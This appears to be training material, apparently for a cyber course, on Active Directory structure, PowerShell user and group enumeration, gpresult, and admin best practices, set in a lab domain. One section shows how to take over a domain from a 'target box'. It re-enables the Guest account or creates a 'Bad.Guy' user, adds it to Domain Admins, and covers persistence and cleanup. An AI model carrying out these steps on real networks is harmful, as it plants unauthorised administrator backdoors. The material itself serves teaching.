# What Is Active Directory?

Active Directory (AD) is a Microsoft technology used to manage computers and other devices on a network. Active Directory allows network administrators to create and manage domains, users, and objects within a network.

**For example**, an admin can create a group of users and give them specific access privileges to certain directories on the server. As a network grows, Active Directory provides a way to organize a large number of users into logical groups and subgroups, while providing access control at each level.

## Active Directory Structure

The Active Directory structure includes three main tiers: **domains, trees, and forests**. Each level of AD has specific access rights that **Domain Controllers** manage.

1.) **Domains**

    Active Directory objects (users or devices) that all use the same database or are typically in the same location.

2.) **Trees**

    Several Domains grouped together. Typically, has a primary domain controller for the entire tree.

3.) **Forests**

    Forests are groups of trees connected together via trust relationships.

![AD_Structure](../../0-src/ADimage1.png)

# Enumerate Users

**When HUNTING on an AD infrastructure for potential malicious users you should look for accounts that seem suspicious.**

***Examples of suspicious accounts include:***

   - Administrator accounts that aren’t known to the network owners

   - Accounts that have been active outside of normal work hours

   - Accounts that are nested in multiple administrative groups

   - Service accounts logging into workstations

   - Accounts that have logged in directly to the Domain Controller that are not normally authorized to do so

   - This information can be collected through PowerShell and Windows Event Logs on the Domain Controller. Windows Logs are the best way to identify security issues.

## Initial Recon
Given: creds for the target box are known

**Get a list of AD Commands Available**
```
PS> Get-Command -Module activedirectory

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Add-ADCentralAccessPolicyMember                    1.0.1.0    ActiveDirectory
Cmdlet          Add-ADComputerServiceAccount                       1.0.1.0    ActiveDirectory
Cmdlet          Add-ADDomainControllerPasswordReplicationPolicy    1.0.1.0    ActiveDirectory
Cmdlet          Add-ADFineGrainedPasswordPolicySubject             1.0.1.0    ActiveDirectory

__________CUT____________
```

**Get the Default Domain Password Policy**

   - AD supports one set of password and account lockout policies for a domain. Beginning in Windows Server 2008, you can override the default password and account lockout policies in a domain using Fine-Grained Password Policies (FGPP)
```
PS> Get-ADDefaultDomainPasswordPolicy

ComplexityEnabled           : True
DistinguishedName           : DC=army,DC=warriors
LockoutDuration             : 00:30:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 0
MaxPasswordAge              : 42.00:00:00
__________CUT____________

```

**Check for any Fine-Grained Password Policies**
```
PS> Get-ADFineGrainedPasswordPolicy -Filter {name -like "*"}

   -No returns means it is not set-
```

**Get Forest details**
```
PS> Get-ADForest

ApplicationPartitions : {DC=DomainDnsZones,DC=army,DC=warriors, DC=ForestDnsZones,DC=army,DC=warriors}
CrossForestReferences : {}
DomainNamingMaster    : domain-controll.army.warriors
Domains               : {army.warriors}
__________CUT____________
```

**Get Domain details:**
```
PS> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=army,DC=warriors
DeletedObjectsContainer            : CN=Deleted Objects,DC=army,DC=warriors
DistinguishedName                  : DC=army,DC=warriors
__________CUT____________
```

**Get AD Groups**
```
Get-ADGroup -Filter *

DistinguishedName : CN=System Admins,CN=Users,DC=army,DC=warriors
GroupCategory     : Security
GroupScope        : Global
Name              : System Admins
__________CUT____________

```
**Get a groups details**
```
PS> Get-ADGroup -Identity 'IA Analysts Team'

DistinguishedName : CN=IA Analysts Team,CN=Users,DC=army,DC=warriors
GroupCategory     : Security
GroupScope        : Global
Name              : IA Analysts Team
__________CUT____________
```

**Get a list of a groups members**
```
PS> Get-ADGroupMember -Identity 'IA Analysts Team' -Recursive
   -No return means there are no assigned members-
```

**Get AD users**
```
PS> Get-ADUser -Filter 'Name -like "*"'

DistinguishedName : CN=Willie.Liu,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors
Enabled           : True
GivenName         : Willie
Name              : Willie.Liu
ObjectClass       : user
__________CUT____________
```

**To see additional properties, not just the default set**
```
PS> Get-ADUser -Identity 'Nina.Webster' -Properties Description

Description       : 3rd PLT Soldier
DistinguishedName : CN=Nina.Webster,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors
Enabled           : True
GivenName         : Nina
Name              : Nina.Webster
ObjectClass       : user
ObjectGUID        : b35ba844-5b40-4eb4-96fd-ffafef36269a
Office            :
SamAccountName    : Nina.Webster
SID               : S-1-5-21-1181003830-945744892-2632747169-1820
Surname           : Webster
UserPrincipalName :
```

## Enumerate users
***If while on a target box we are concerned a legitimate user will log on during our mission consider the following***

### Scenario 1: Find a user already on the box

**Find Disabled users**
```
PS> get-aduser -filter {Enabled -eq "FALSE"} -properties name, enabled

DistinguishedName : CN=Guest,CN=Users,DC=army,DC=warriors
Enabled           : False
GivenName         :
Name              : Guest
ObjectClass       : user
__________CUT____________

```

**Enable that user**
```
PS> Enable-ADAccount -Identity guest
   -Nothing returned if successful execution-
```

***The password must meet domain complexity requirements***

**Change the password**
```
PS> Set-AdAccountPassword -Identity guest -NewPassword (ConvertTo-SecureString -AsPlaintext -String "PassWord12345!!" -Force)
   -Nothing returned if successful execution-
```

**Add the user to an Admin Group**
```
Add-ADGroupMember -Identity "Domain Admins" -Members guest
-Nothing returned if successful execution-
```

***You now own the network!***

### Scenario 2: Create a new user on the box

***Run the following command to get a sample of the Distinguished Name to match AD format***

**Get Distinguished Name to match AD format**
```
PS> Get-ADuser -filter * | select distinguishedname, name

CN=Amelie.Benjamin,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors     Amelie.Benjamin
CN=Ramon.Gibbs,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors         Ramon.Gibbs
CN=Willie.Liu,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors          Willie.Liu
CN=Yair.Roth,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors           Yair.Roth
CN=Elisha.Coleman,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors      Elisha.Coleman
__________CUT____________
```

**Create a new user**
```
New-ADUser -Name "Bad.Guy" -AccountPassword (ConvertTo-SecureString -AsPlaintext -String "PassWord12345!!" -Force) -path "OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors"
   -Nothing returned if successful execution-
```

**Enable the user**
```
Enable-ADAccount -Identity "Bad.Guy"
   -Nothing returned if successful execution-
```

**Add the user to an Admin Group**
```
Add-ADGroupMember -Identity "Domain Admins" -Members "Bad.Guy"
   -Nothing returned if successful execution-
```

***You now own the network!***

***When we are done, if we aren’t maintaining persistence, we need to delete the new account or remove it from its group and disable it.***

**Remove User**
```
PS> Remove-ADUser -Identity "Bad.Guy"

Confirm
Are you sure you want to perform this action?
Performing the operation "Remove" on target "CN=Bad.Guy,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors".
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): Y
```
**Remove From Group**
```
PS> Remove-ADGroupMember -Identity "Domain Admins" -Members guest

Confirm
Are you sure you want to perform this action?
Performing the operation "Remove" on target "CN=Bad.Guy,OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors".
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): Y
```
**Disable Guest account**
```
PS> Disable-AdAccount -Identity Guest
   -Nothing returned if successful execution-
```

## Enumerate Users from a DCO perspective

### Scenario: You are an admin and need to periodically check what accounts have 'Enterprise' and 'Domain' level access

**Get All Domain Admin Accounts**
```
PS> Get-AdGroupMember -identity "Domain Admins" -Recursive | %{Get-ADUser -identity $_.DistinguishedName}

PS> Get-AdGroupMember -identity "Domain Admins" -Recursive | %{Get-ADUser -identity $_.DistinguishedName} | select name, Enabled

name            Enabled
----            -------
Administrator      True
andy.dwyer         True
Giada.Barrett      True
Garrett.Lowery     True
Trevon.Wolfe       True
Angelo.Berry       True
__________CUT____________
```
**Get ALL Enterprise Admin accounts**
```
Get-AdGroupMember -identity "Enterprise Admins" -Recursive | %{Get-ADUser -identity $_.DistinguishedName} | select name, Enabled

name          Enabled
----          -------
Administrator    True
__________CUT____________
```

## Display Resultant Set of Policy(RSoP) Information

Run gpresult from the Domain Controller.

RsoP (Resultant Set of Policy) is a Microsoft tool that is built into Windows 7 and later versions. It provides administrators a report on what group policy settings are getting applied to users and computers.

[Microsoft Article on using GPresult](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult)

**1. Display Help**
```
C:> gpresult /?

GPRESULT [/S system [/U username [/P [password]]]] [/SCOPE scope]
           [/USER targetusername] [/R | /V | /Z] [(/X | /H) <filename> [/F]]

Description:
    This command line tool displays the Resultant Set of Policy (RSoP)
    information for a target user and computer.
__________CUT____________
```

**2. Output the computer and user node settings of a user**
```
C:> gpresult /user * /v
```
   - `gpresult` → Retrieves Group Policy settings for a user or computer.

   - `/user *` → Specifies that Group Policy information should be retrieved for all users on the system (* wildcard means all users).

   - `/v` → Enables verbose mode, providing detailed information about applied Group Policy settings.
```
C:> gpresult /user Administrator /v

RSOP data for ARMY\Administrator on DOMAIN-CONTROLL : Logging Mode


OS Configuration:            Primary Domain Controller
OS Version:                  10.0.17763
Site Name:                   Default-First-Site-Name
Roaming Profile:             N/A
Local Profile:               C:\Users\Administrator
__________CUT____________
```

**3. Displays data about the machine and logged on user**
```
C:> gpresult /r

COMPUTER SETTINGS

    CN=DOMAIN-CONTROLL,OU=Domain Controllers,DC=army,DC=warriors
    Last time Group Policy was applied: 2/25/2021 at 6:21:44 PM
    Group Policy was applied from:      domain-controll.army.warriors
    Group Policy slow link threshold:   500 kbps
    Domain Name:                        ARMY
    Domain Type:                        Windows 2008 or later
__________CUT____________
```

**4. Force any group policy setting to take affect immediately versus rebooting the computer**
```
C:> gpupdate /force

Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```
**3. Administrator Best Practices**
***Q&A***

   - Question 1 What are AD Administrator best practices?

     - Answer 1 Administrator groups should be segregated by least privilege. Nesting of administrative groups should be avoided to ensure no privileges are falsely allocated.

   - Question 2 What security flaw does this create?

     - Answer 2 Group hierarchy should be taken into account when distributing privileges across a network or domain.
     - Different level of privileges should be created and distributed to personnel requiring only that level of privilege.
     - Multiple site organizations should not have administrative accounts with privileges to multiple sites.
     - Segregation of sites should created to ensure proper security of the domain.

## AD Group Nesting Flaws

The ***Name*** Property will show the names of each member of the group

**1. Get Name Property from the Active Directory Group named "Domain Admins"**
```
PS> (Get-AdGroupMember -Identity 'domain admins').Name
Administrator
System Admins LV1

PS> Get-AdGroupMember -Identity 'domain admins' | select name

name
--------
Administrator
System Admins LV1
```
**2. Get Active Directory Group 'System' Admin Names 'LvL 1'**
```
PS> (Get-AdGroupMember -Identity "System Admins LV1").Name
System Admins
```
**3. Get Active Directory Group 'System Admin' Names**
```
PS> (Get-AdGroupMember -Identity "System Admins").Name
andy.dwyer
System Admins
Print Server Group
System Admins LV2
Giada.Barrett
Garrett.Lowery
Trevon.Wolfe
Angelo.Berry
```

**4. Get Active Directory Group 'System' Admin Names 'LVL 2'**
```
PS> (Get-AdGroupMember -Identity "System Admins LV2").Name
Silas.Salas
Shania.Reilly
Santino.Glass
Xavier.Ibarra
London.Cantrell
Raegan.Lee
```

**Q&A**

   - Question 1 Is it a good idea to have all admin users with full domain admin privileges?

     - Answer 1 No

   - Question 2 Should users be allowed to log onto machines with administrative credentials?

     - Answer 2 No. Many administrators tend to log onto machines with their administrative account rather than a regular user account and then escalating privileges. This can cause many issues. The main being that if an attacker was on the box he/she would be able to potentially hijack your session.

   - Question 3 Should the default local administrator account be left enabled?

     - Answer 3 No. The default local administrator account on all hosts should be disabled.
     - If an attacker were to compromise just 1 system with knowledge of the default admin, then the rest of the domain would be easily owned.

References

  - [Security System Components, Safari Books Online](http://techbus.safaribooksonline.com/book/operating-systems-and-server-administration/microsoft-windows/9780735671294/6dot-security/ch06s02_html)

